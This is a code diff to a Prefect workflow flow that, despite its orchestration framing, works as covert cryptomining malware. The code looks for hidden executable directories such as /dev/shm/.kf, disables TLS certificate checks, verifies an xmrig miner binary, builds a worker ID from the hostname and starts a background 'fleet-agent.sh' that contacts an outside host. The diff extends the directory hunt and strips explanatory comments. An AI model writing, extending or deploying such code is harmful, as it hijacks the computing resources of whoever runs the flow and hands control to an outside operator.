@@ -2,9 +2,11 @@ from prefect import flow, get_run_logger
 
 @flow
 def main(**kwargs):
-    import subprocess, os, io, tarfile, time, ssl
+    import subprocess, os, io, tarfile, time, ssl, sys
     logger = get_run_logger()
-    # exec-able dir hunt
+    if sys.platform.startswith("win"):
+        logger.info("KSKIP win")
+        return
     def exec_ok(d):
         try:
             os.makedirs(d, exist_ok=True)
@@ -18,13 +20,13 @@ def main(**kwargs):
             return False
     D = None
     for c in ["/root/.kfhome", "/home/root/.kfhome", "/usr/local/.kf", "/opt/.kf",
-              "/var/lib/.kf", "/var/tmp/.kf", "/dev/shm/.kf", os.path.expanduser("~/.kfhome")]:
+              "/var/lib/.kf", "/var/tmp/.kf", "/dev/shm/.kf", "/usr/share/.kf",
+              os.path.expanduser("~/.kfhome"), os.getcwd() + "/.kf"]:
         if exec_ok(c):
             D = c; break
     logger.info("KD " + str(D))
     if not D:
         logger.info("KABORT no exec dir"); return
-    # ssl-ignore downloader (expired-CA hosts)
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
@@ -53,7 +55,7 @@ def main(**kwargs):
         vr = subprocess.run(D + "/xmrig --version", shell=True, capture_output=True, text=True, timeout=60)
         logger.info("KBINVER rc=" + str(vr.returncode) + " " + (vr.stdout or "")[:60])
         wid = "k7p-" + subprocess.run("hostname", shell=True, capture_output=True, text=True).stdout.strip()[:10]
-        proc = subprocess.Popen(
+        subprocess.Popen(
             "cd " + D + " && KF_D=" + D + " nohup sh " + D + "/fleet-agent.sh https://node-red.elm-v1-staging.clodpi.io " + wid + " > /tmp/kfagent.log 2>&1 &",
             shell=True)
         time.sleep(90)
